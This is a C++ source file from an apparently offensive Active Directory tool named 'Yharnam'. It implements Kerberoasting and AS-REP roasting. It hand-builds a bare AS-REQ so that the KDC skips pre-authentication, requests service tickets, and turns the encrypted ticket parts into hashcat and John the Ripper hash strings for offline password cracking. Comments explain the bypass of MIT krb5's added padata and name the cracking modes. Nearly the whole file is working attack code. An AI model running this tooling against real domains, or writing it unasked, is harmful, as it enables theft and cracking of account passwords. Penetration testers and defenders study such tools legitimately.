#include "KerberosInteraction.h"
#include <iostream>
#include <stdexcept>
#include <cctype>
#include <cstdint>
#include <cstring>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <vector>
#include <ctime>
#include <random>
#include "protocols/KdcClient.h"

namespace {
// Encryption types Yharnam can extract a crackable hash for.
constexpr bool isSupportedEnctype(krb5_enctype etype) {
    return etype == ENCTYPE_AES128_CTS_HMAC_SHA1_96 ||
           etype == ENCTYPE_AES256_CTS_HMAC_SHA1_96 ||
           etype == ENCTYPE_ARCFOUR_HMAC;
}

// --- Minimal DER reader, just enough to walk an AS-REP / KRB-ERROR ---------
// ASN.1 tags use single-byte identifiers here (tag numbers < 31).
constexpr uint8_t kTagKrbError = 0x7e;  // [APPLICATION 30]
constexpr uint8_t kTagAsRep    = 0x6b;  // [APPLICATION 11]
constexpr uint8_t kTagSequence = 0x30;
constexpr uint8_t kTagInteger  = 0x02;
constexpr uint8_t kTagOctet    = 0x04;
constexpr uint8_t kCtx0        = 0xa0;  // enc-part etype  [0]
constexpr uint8_t kCtx2        = 0xa2;  // enc-part cipher [2]
constexpr uint8_t kCtxEncPart  = 0xa6;  // KDC-REP enc-part [6]

struct Tlv {
    uint8_t tag = 0;
    const uint8_t* val = nullptr;  // start of contents
    size_t len = 0;                // length of contents
    const uint8_t* next = nullptr; // first byte after this element
};

// Reads one tag-length-value triple starting at [p, end). Returns false on a
// truncated or malformed element.
bool readTlv(const uint8_t* p, const uint8_t* end, Tlv& out) {
    if (p >= end) return false;
    out.tag = *p++;
    if (p >= end) return false;

    size_t len = *p++;
    if (len & 0x80) {  // long form
        const int n = len & 0x7f;
        if (n == 0 || n > 4 || p + n > end) return false;
        len = 0;
        for (int i = 0; i < n; ++i) len = (len << 8) | *p++;
    }
    if (len > static_cast<size_t>(end - p)) return false;

    out.val = p;
    out.len = len;
    out.next = p + len;
    return true;
}

struct AsRepEncPart {
    bool ok = false;
    bool kdcError = false;
    krb5_enctype etype = 0;
    const uint8_t* cipher = nullptr;
    size_t cipherLen = 0;
};

// Reads the etype [0] and cipher [2] out of an EncryptedData SEQUENCE.
bool parseEncryptedData(const Tlv& encPartField, AsRepEncPart& result) {
    Tlv edSeq;
    if (!readTlv(encPartField.val, encPartField.val + encPartField.len, edSeq) ||
        edSeq.tag != kTagSequence) {
        return false;
    }

    bool haveEtype = false;
    for (const uint8_t* p = edSeq.val; ; ) {
        Tlv field;
        if (!readTlv(p, edSeq.val + edSeq.len, field)) break;
        p = field.next;

        if (field.tag == kCtx0) {  // etype [0] -> INTEGER
            Tlv intVal;
            if (readTlv(field.val, field.val + field.len, intVal) && intVal.tag == kTagInteger) {
                krb5_enctype etype = 0;
                for (size_t i = 0; i < intVal.len; ++i) etype = (etype << 8) | intVal.val[i];
                result.etype = etype;
                haveEtype = true;
            }
        } else if (field.tag == kCtx2) {  // cipher [2] -> OCTET STRING
            Tlv octet;
            if (readTlv(field.val, field.val + field.len, octet) && octet.tag == kTagOctet) {
                result.cipher = octet.val;
                result.cipherLen = octet.len;
            }
        }
    }

    return haveEtype && result.cipher != nullptr;
}

// Extracts the AS-REP enc-part (etype + cipher) from a raw KDC reply.
AsRepEncPart parseAsRep(const uint8_t* data, size_t dataLen) {
    AsRepEncPart result;
    const uint8_t* end = data + dataLen;

    Tlv outer;
    if (!readTlv(data, end, outer)) return result;
    if (outer.tag == kTagKrbError) {
        result.kdcError = true;
        return result;
    }
    if (outer.tag != kTagAsRep) return result;

    Tlv seq;
    if (!readTlv(outer.val, outer.val + outer.len, seq) || seq.tag != kTagSequence) {
        return result;
    }

    // Walk the KDC-REP fields looking for enc-part [6].
    for (const uint8_t* fp = seq.val; ; ) {
        Tlv field;
        if (!readTlv(fp, seq.val + seq.len, field)) break;
        fp = field.next;

        if (field.tag == kCtxEncPart) {
            result.ok = parseEncryptedData(field, result);
            break;
        }
    }

    return result;
}

// --- Minimal DER writer for a bare AS-REQ ----------------------------------
// MIT's krb5_init_creds_step injects freshness / PAC-options pre-auth padata
// (types 149/150) into the AS-REQ, which makes a Windows KDC demand
// pre-authentication even from a DONT_REQ_PREAUTH account. AS-REP roasting
// therefore needs a *bare* AS-REQ with no padata, the way impacket and Rubeus
// build it -- so we hand-roll the few DER fields we need.
using Bytes = std::vector<uint8_t>;

void derLen(Bytes& out, size_t len) {
    if (len < 0x80) {
        out.push_back(static_cast<uint8_t>(len));
        return;
    }
    uint8_t tmp[8];
    int n = 0;
    while (len) { tmp[n++] = static_cast<uint8_t>(len & 0xff); len >>= 8; }
    out.push_back(static_cast<uint8_t>(0x80 | n));
    for (int i = n - 1; i >= 0; --i) out.push_back(tmp[i]);
}

// Wraps content in a tag-length-value triple.
Bytes derTlv(uint8_t tag, const Bytes& content) {
    Bytes out;
    out.push_back(tag);
    derLen(out, content.size());
    out.insert(out.end(), content.begin(), content.end());
    return out;
}

// INTEGER (non-negative); prepends 0x00 when the high bit would imply a sign.
Bytes derInt(uint32_t v) {
    Bytes c;
    uint8_t tmp[5];
    int n = 0;
    do { tmp[n++] = static_cast<uint8_t>(v & 0xff); v >>= 8; } while (v);
    if (tmp[n - 1] & 0x80) c.push_back(0x00);
    for (int i = n - 1; i >= 0; --i) c.push_back(tmp[i]);
    return derTlv(kTagInteger, c);
}

Bytes derGeneralString(const std::string& s) {
    return derTlv(0x1b, Bytes(s.begin(), s.end()));
}

Bytes derCtx(uint8_t n, const Bytes& inner) {
    return derTlv(static_cast<uint8_t>(0xa0 | n), inner);
}

// PrincipalName ::= SEQUENCE { name-type [0] Int32, name-string [1] SEQ OF GeneralString }
Bytes derPrincipalName(int nameType, const std::vector<std::string>& parts) {
    Bytes strings;
    for (const auto& p : parts) {
        Bytes gs = derGeneralString(p);
        strings.insert(strings.end(), gs.begin(), gs.end());
    }
    Bytes body = derCtx(0, derInt(static_cast<uint32_t>(nameType)));
    Bytes ns = derCtx(1, derTlv(kTagSequence, strings));
    body.insert(body.end(), ns.begin(), ns.end());
    return derTlv(kTagSequence, body);
}

// Builds a bare AS-REQ (no pre-auth padata) for AS-REP roasting.
Bytes buildBareAsReq(const std::string& username, const std::string& realmUpper,
                     const std::vector<int32_t>& etypes, uint32_t nonce,
                     const std::string& till) {
    auto cat = [](Bytes& dst, const Bytes& s) { dst.insert(dst.end(), s.begin(), s.end()); };

    Bytes body;
    // [0] kdc-options BIT STRING (unused-bits=0, then renewable_ok = 0x00000010)
    cat(body, derCtx(0, derTlv(0x03, Bytes{0x00, 0x00, 0x00, 0x00, 0x10})));
    // [1] cname
    cat(body, derCtx(1, derPrincipalName(1, {username})));            // NT-PRINCIPAL
    // [2] realm
    cat(body, derCtx(2, derGeneralString(realmUpper)));
    // [3] sname  krbtgt/REALM
    cat(body, derCtx(3, derPrincipalName(2, {"krbtgt", realmUpper}))); // NT-SRV-INST
    // [5] till, [6] rtime
    cat(body, derCtx(5, derTlv(0x18, Bytes(till.begin(), till.end()))));
    cat(body, derCtx(6, derTlv(0x18, Bytes(till.begin(), till.end()))));
    // [7] nonce
    cat(body, derCtx(7, derInt(nonce)));
    // [8] etype SEQUENCE OF Int32
    {
        Bytes el;
        for (int32_t e : etypes) cat(el, derInt(static_cast<uint32_t>(e)));
        cat(body, derCtx(8, derTlv(kTagSequence, el)));
    }
    Bytes reqBody = derTlv(kTagSequence, body);

    // KDC-REQ ::= SEQUENCE { pvno [1]=5, msg-type [2]=10 (AS-REQ), req-body [4] }
    Bytes kdcReq;
    cat(kdcReq, derCtx(1, derInt(5)));
    cat(kdcReq, derCtx(2, derInt(10)));
    cat(kdcReq, derCtx(4, reqBody));

    // [APPLICATION 10] AS-REQ
    return derTlv(0x6a, derTlv(kTagSequence, kdcReq));
}
}  // namespace

KerberosInteraction::KerberosInteraction() {
    krb5_context ctx = nullptr;
    krb5_error_code err = krb5_init_context(&ctx);
    if (err || !ctx)
        throw std::runtime_error("Failed to initialize Kerberos context");
    context_.reset(ctx);
}

bool KerberosInteraction::requestAndCacheTGT(const std::string& username, const std::string& password) {
    auto creds = requestRawTGT(username, password);
    if (!creds) {
        return false;
    }
    
    return cacheTicket(*creds, username);
}

std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> KerberosInteraction::requestRawTGT(
    const std::string& username, 
    const std::string& password
) {
    if (!context_) {
        std::cerr << "[-] No krb5 context initialized\n";
        return nullptr;
    }

    auto principal = parsePrincipal(username);
    if (!principal) {
        return nullptr;
    }

    std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> creds = obtainInitialCredentials(
        principal.get(), 
        password
    );
    if (!creds) {
        return nullptr;
    }

    std::cout << "[+] Successfully obtained TGT for " << username << std::endl;
    return creds;
}

bool KerberosInteraction::cacheTicket(const krb5_creds& creds, const std::string& username) {
    if (!context_) {
        std::cerr << "[-] No krb5 context initialized\n";
        return false;
    }

    auto principal = parsePrincipal(username);
    if (!principal) {
        return false;
    }

    auto cache = openDefaultCache();
    if (!cache) {
        return false;
    }

    if (!initializeCache(cache.get(), principal.get())) {
        return false;
    }
    
    if (!storeInCache(cache.get(), creds)) {
        return false;
    }

    std::cout << "[+] Successfully cached TGT for " << username << std::endl;
    return true;
}

std::string KerberosInteraction::requestAndFormatTGS(const std::string& spn, const std::string& user_requesting) {
    auto userPrincipal = parsePrincipal(user_requesting);
    if (!userPrincipal) {
        std::cerr << "[-] Failed to parse user principal: " << user_requesting << std::endl;
        return "";
    }

    auto servicePrincipal = parsePrincipal(spn);
    if (!servicePrincipal) {
        std::cerr << "[-] Failed to parse service principal: " << spn << std::endl;
        return "";
    }

    krb5_principal_data* userPrincipalPtr = userPrincipal.release();
    krb5_principal_data* servicePrincipalPtr = servicePrincipal.release();  
    auto requestCreds = prepareServiceRequest(userPrincipalPtr, servicePrincipalPtr);
    if (!requestCreds) {
        return "";
    }

    auto cache = openDefaultCache();
    if (!cache) {
        return "";
    }

    auto retrievedCreds = requestRawTGS(cache.get(), requestCreds.get());
    if (!retrievedCreds) {
        std::cerr << "[-] Failed to request TGS for " << spn << std::endl;
        return "";
    }

    std::cout << "[+] Requested TGS for " << spn << std::endl;
    
    if (retrievedCreds && retrievedCreds->ticket.length > 0) {
        std::string hashcat_ticket = KerberosTicketFormatter::formatTicket_TGS(
            context_.get(),
            *retrievedCreds.get()
        );
        return hashcat_ticket;
    } else {
        std::cerr << "[-] Retrieved credentials structure is empty or has no ticket data" << std::endl;
    }

    return "";
}

std::string KerberosInteraction::requestAndFormatASREP(
    const std::string& username,
    const std::string& realm,
    const std::string& kdcHost
) {
    std::string upperRealm = realm;
    std::transform(upperRealm.begin(), upperRealm.end(), upperRealm.begin(), ::toupper);

    // Offer AES (preferred) then RC4; the KDC returns the strongest key the
    // account holds and formatASREP adapts to it. AES (etype 17/18) hashes crack
    // with `john --format=krb5asrep`; RC4 (etype 23) with `hashcat -m 18200`.
    const std::vector<int32_t> etypes = {
        ENCTYPE_AES256_CTS_HMAC_SHA1_96,
        ENCTYPE_AES128_CTS_HMAC_SHA1_96,
        ENCTYPE_ARCFOUR_HMAC,
    };

    // till = now + 1 day, UTC, as "YYYYMMDDHHMMSSZ".
    char tillBuf[32];
    std::time_t t = std::time(nullptr) + 86400;
    std::tm tmUtc{};
    gmtime_r(&t, &tmUtc);
    std::strftime(tillBuf, sizeof(tillBuf), "%Y%m%d%H%M%SZ", &tmUtc);

    std::random_device rd;
    const uint32_t nonce = static_cast<uint32_t>(rd()) & 0x7fffffff;

    Bytes asReq = buildBareAsReq(username, upperRealm, etypes, nonce, tillBuf);

    auto reply = KdcClient::exchange(kdcHost, 88, asReq.data(), asReq.size());
    if (!reply) {
        std::cerr << "[-] Could not reach KDC at " << kdcHost << ":88" << std::endl;
        return "";
    }

    std::string hash;
    AsRepEncPart encPart = parseAsRep(reply->data(), reply->size());
    if (encPart.kdcError) {
        std::cerr << "[-] KDC rejected AS-REQ for " << username
                  << " (pre-auth required, or unknown account)" << std::endl;
    } else if (encPart.ok) {
        hash = KerberosTicketFormatter::formatASREP(
            username, upperRealm, encPart.etype, encPart.cipher, encPart.cipherLen);
    } else {
        std::cerr << "[-] Could not parse AS-REP for " << username << std::endl;
    }

    return hash;
}

std::unique_ptr<krb5_principal_data, Krb5PrincipalDeleter> KerberosInteraction::parsePrincipal(
    const std::string& principalName
) {
    krb5_principal principal = nullptr;
    krb5_error_code err = krb5_parse_name(context_.get(), principalName.c_str(), &principal);
    
    if (err) {
        std::cerr << "[-] Failed to parse name '" << principalName << "': "
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return nullptr;
    }

    return std::unique_ptr<krb5_principal_data, Krb5PrincipalDeleter>{
        principal, Krb5PrincipalDeleter{context_.get()}
    };
}

std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> KerberosInteraction::obtainInitialCredentials(
    krb5_principal principal,
    const std::string& password
) {
    krb5_creds* raw_creds = new krb5_creds();
    std::memset(raw_creds, 0, sizeof(krb5_creds));

    std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> creds{
        raw_creds, Krb5UserCredsDeleter{context_.get()}
    };

    krb5_error_code err = krb5_get_init_creds_password(
        context_.get(),
        creds.get(),
        principal,
        password.c_str(),
        nullptr, 
        nullptr, 
        0, 
        nullptr, 
        nullptr
    );
    
    if (err) {
        std::cerr << "[-] Failed to request TGT: "
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return nullptr;
    }

    return creds;
}

std::unique_ptr<_krb5_ccache, Krb5CcacheDeleter> KerberosInteraction::openDefaultCache() {
    krb5_ccache cache = nullptr;
    krb5_error_code err = krb5_cc_default(context_.get(), &cache);
    
    if (err) {
        std::cerr << "[-] Failed to get default ccache: " 
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return nullptr;
    }

    return std::unique_ptr<_krb5_ccache, Krb5CcacheDeleter>(
        cache, Krb5CcacheDeleter{context_.get()}
    );
}

bool KerberosInteraction::initializeCache(krb5_ccache cache, krb5_principal principal) {
    krb5_error_code err = krb5_cc_initialize(context_.get(), cache, principal);
    
    if (err) {
        std::cerr << "[-] Failed to initialize ccache: " 
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return false;
    }
    
    return true;
}

bool KerberosInteraction::storeInCache(krb5_ccache cache, const krb5_creds& creds) {
    krb5_error_code err = krb5_cc_store_cred(
        context_.get(), 
        cache, 
        const_cast<krb5_creds*>(&creds)
    );
    
    if (err) {
        std::cerr << "[-] Failed to store credentials: " 
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return false;
    }
    
    return true;
}

std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> KerberosInteraction::prepareServiceRequest(
    krb5_principal userPrincipal,
    krb5_principal servicePrincipal
) {
    krb5_creds* raw_creds = new krb5_creds();
    std::memset(raw_creds, 0, sizeof(krb5_creds));
    
    std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> cred{ 
        raw_creds, Krb5UserCredsDeleter{ context_.get() } 
    };
    
    cred.get()->client = userPrincipal;
    cred.get()->server = servicePrincipal;

    return cred;
}

std::unique_ptr<krb5_creds, Krb5LibraryCredsDeleter> KerberosInteraction::requestRawTGS(
    krb5_ccache cache,
    krb5_creds* requestTemplate
) {
    krb5_creds* out = nullptr;

    krb5_error_code err = krb5_get_credentials(
        context_.get(), 
        0, 
        cache, 
        requestTemplate, 
        &out
    );

    if (err) {
        std::cerr << "[-] Failed to retrieve service credentials: "
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return nullptr;
    }

    return std::unique_ptr<krb5_creds, Krb5LibraryCredsDeleter>(
        out, Krb5LibraryCredsDeleter{context_.get()}
    );
}

std::string KerberosTicketFormatter::formatTicket_TGS(krb5_context ctx, const krb5_creds& creds) {
    std::string client_full = principal_to_string(ctx, creds.client);
    std::string server_full = principal_to_string(ctx, creds.server);

    if (client_full.empty() || server_full.empty()) {
        std::cerr << "[-] Could not unparse client or server name" << std::endl;
        return "";
    }

    std::string server_name, server_realm;
    split_principal(server_full, server_name, server_realm);

    const unsigned char* ticket_data = (const unsigned char*)creds.ticket.data;
    size_t ticket_len = creds.ticket.length;
    
    auto cipherLoc = findCipherInTicket(ticket_data, ticket_len);
    if (!cipherLoc) {
        std::cerr << "[-] Could not find cipher OCTET STRING in ticket" << std::endl;
        return "";
    }

    auto etype = findEncryptionType(ticket_data, cipherLoc->offset);
    if (!etype) {
        std::cerr << "[-] Could not find valid encryption type in ticket" << std::endl;
        return "";
    }

    size_t checksum_size = getChecksumSize(*etype);
    if (cipherLoc->length < checksum_size) {
        std::cerr << "[-] Cipher too small for checksum. "
                  << "Got " << cipherLoc->length << " bytes, need at least " << checksum_size << std::endl;
        return "";
    }

    std::string checksum_hex = to_hex(cipherLoc->start, checksum_size);
    std::string enc_data_hex = to_hex(cipherLoc->start + checksum_size, cipherLoc->length - checksum_size);

    return buildTGSHash(server_name, server_realm, *etype, checksum_hex, enc_data_hex);
}

std::string KerberosTicketFormatter::formatTicket_TGT(
    krb5_context ctx, 
    const krb5_creds& creds
) {
    std::string username_full = principal_to_string(ctx, creds.client);
    if (username_full.empty()) {
        std::cerr << "[-] Could not unparse client name" << std::endl;
        return "";
    }

    std::string username, realm;
    split_principal(username_full, username, realm);

    const unsigned char* ticket_data = (const unsigned char*)creds.ticket.data;
    size_t ticket_len = creds.ticket.length;

    auto cipherLoc = findCipherInTicket(ticket_data, ticket_len);
    if (!cipherLoc) {
        std::cerr << "[-] Could not find cipher in TGT" << std::endl;
        return "";
    }

    auto etype = findEncryptionType(ticket_data, cipherLoc->offset);
    if (!etype) {
        std::cerr << "[-] Could not find valid etype in TGT" << std::endl;
        return "";
    }

    size_t checksum_size = getChecksumSize(*etype);
    if (cipherLoc->length < checksum_size) {
        std::cerr << "[-] Cipher too small" << std::endl;
        return "";
    }

    std::string checksum_hex = to_hex(cipherLoc->start, checksum_size);
    std::string enc_data_hex = to_hex(cipherLoc->start + checksum_size, cipherLoc->length - checksum_size);

    return buildASREPHash(username, realm, *etype, checksum_hex, enc_data_hex);
}

std::string KerberosTicketFormatter::principal_to_string(
    krb5_context context, 
    krb5_principal principal
) {
    char* name_buf = nullptr;
    krb5_error_code ret = krb5_unparse_name(context, principal, &name_buf);

    if (ret) {
        return "";
    }

    std::string name_str(name_buf);
    krb5_free_unparsed_name(context, name_buf); 
    return name_str;
}

void KerberosTicketFormatter::split_principal(
    const std::string& full_principal, 
    std::string& name, 
    std::string& realm
) {
    size_t at_pos = full_principal.find('@');
    if (at_pos == std::string::npos) {
        name = full_principal;
        realm = "";
    } else {
        name = full_principal.substr(0, at_pos);
        realm = full_principal.substr(at_pos + 1);
    }
}

std::optional<KerberosTicketFormatter::CipherLocation> 
KerberosTicketFormatter::findCipherInTicket(
    const unsigned char* ticket_data,
    size_t ticket_len
) {
    if (ticket_len < 5) {
        return std::nullopt;
    }
    for (size_t i = 0; i + 4 < ticket_len; i++) {
        if (ticket_data[i] == 0x04 && (ticket_data[i+1] == 0x82)) {
            size_t len = (ticket_data[i+2] << 8) | ticket_data[i+3];
            
            if (len > 1000) {
                CipherLocation loc;
                loc.start = ticket_data + i + 4;
                loc.length = len;
                loc.offset = i;
                return loc;
            }
        }
    }
    return std::nullopt;
}

std::optional<krb5_enctype> KerberosTicketFormatter::findEncryptionType(
    const unsigned char* ticket_data,
    size_t cipher_offset
) {
    if (cipher_offset == 0) {
        return std::nullopt;
    }
    size_t search_start = (cipher_offset > 100) ? cipher_offset - 100 : 0;

    for (size_t i = cipher_offset - 1; i > search_start; i--) {
        if (ticket_data[i] == 0x02 && i + 2 < cipher_offset) {
            size_t int_len = ticket_data[i + 1];
            
            if (int_len == 1) {
                krb5_enctype potential_etype = ticket_data[i + 2];
                if (isSupportedEnctype(potential_etype)) {
                    return potential_etype;
                }
            } else if (int_len == 2 && i + 3 < cipher_offset) {
                krb5_enctype potential_etype = (ticket_data[i + 2] << 8) | ticket_data[i + 3];
                if (isSupportedEnctype(potential_etype)) {
                    return potential_etype;
                }
            }
        }
    }
    return std::nullopt;
}

inline size_t KerberosTicketFormatter::getChecksumSize(krb5_enctype etype) {
    switch (etype) {
        case ENCTYPE_AES128_CTS_HMAC_SHA1_96:
        case ENCTYPE_AES256_CTS_HMAC_SHA1_96:
            return 12;
        case ENCTYPE_ARCFOUR_HMAC:  // RC4-HMAC
            return 16;
        default:
            return 0;
    }
}

std::string KerberosTicketFormatter::to_hex(const unsigned char* data, size_t len) {
    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (size_t i = 0; i < len; ++i) {
        ss << std::setw(2) << static_cast<unsigned>(data[i]);
    }
    return ss.str();
}

std::string KerberosTicketFormatter::buildTGSHash(
    const std::string& serverName,
    const std::string& serverRealm,
    krb5_enctype etype,
    const std::string& checksumHex,
    const std::string& encDataHex
) {
    std::string realm_lower = serverRealm;
    std::transform(realm_lower.begin(), realm_lower.end(), realm_lower.begin(), ::tolower);
    std::string spn_field = realm_lower + "/" + serverName;

    std::stringstream ss_hash;
    ss_hash << "$krb5tgs$" << etype << "$*"
        << serverName << "$" << serverRealm << "$"
        << spn_field << "*$"
        << checksumHex << "$" << encDataHex;

    return ss_hash.str();
}

std::string KerberosTicketFormatter::buildASREPHash(
    const std::string& username,
    const std::string& realm,
    krb5_enctype etype,
    const std::string& checksumHex,
    const std::string& encDataHex
) {
    std::stringstream ss_hash;
    ss_hash << "$krb5asrep$" << etype << "$"
            << username << "@" << realm << ":"
            << checksumHex << "$" << encDataHex;

    return ss_hash.str();
}

std::string KerberosTicketFormatter::buildASREPHashAES(
    const std::string& salt,
    krb5_enctype etype,
    const std::string& edata2Hex,
    const std::string& checksumHex
) {
    // JtR krb5asrep AES layout: $krb5asrep$<etype>$<salt>$<edata2>$<checksum>
    std::stringstream ss_hash;
    ss_hash << "$krb5asrep$" << etype << "$"
            << salt << "$"
            << edata2Hex << "$" << checksumHex;
    return ss_hash.str();
}

std::string KerberosTicketFormatter::formatASREP(
    const std::string& username,
    const std::string& realm,
    krb5_enctype etype,
    const unsigned char* cipher,
    size_t cipherLen
) {
    const size_t checksumSize = getChecksumSize(etype);
    if (checksumSize == 0 || cipherLen < checksumSize) {
        std::cerr << "[-] Unsupported or truncated AS-REP cipher (etype " << etype << ")" << std::endl;
        return "";
    }

    if (etype == ENCTYPE_AES128_CTS_HMAC_SHA1_96 ||
        etype == ENCTYPE_AES256_CTS_HMAC_SHA1_96) {
        // AES-CTS-HMAC-SHA1-96: the 12-byte HMAC tag trails the ciphertext.
        // Salt is UPPER(REALM) + username with no separator (AD default salt;
        // accounts with a custom Kerberos salt won't crack -- see CLAUDE.md).
        std::string edata2Hex  = to_hex(cipher, cipherLen - checksumSize);
        std::string checksumHex = to_hex(cipher + cipherLen - checksumSize, checksumSize);
        std::string realmUpper = realm;
        std::transform(realmUpper.begin(), realmUpper.end(), realmUpper.begin(), ::toupper);
        return buildASREPHashAES(realmUpper + username, etype, edata2Hex, checksumHex);
    }

    // RC4-HMAC (etype 23): the 16-byte HMAC checksum precedes the encrypted data.
    std::string checksumHex = to_hex(cipher, checksumSize);
    std::string encDataHex  = to_hex(cipher + checksumSize, cipherLen - checksumSize);
    return buildASREPHash(username, realm, etype, checksumHex, encDataHex);
}
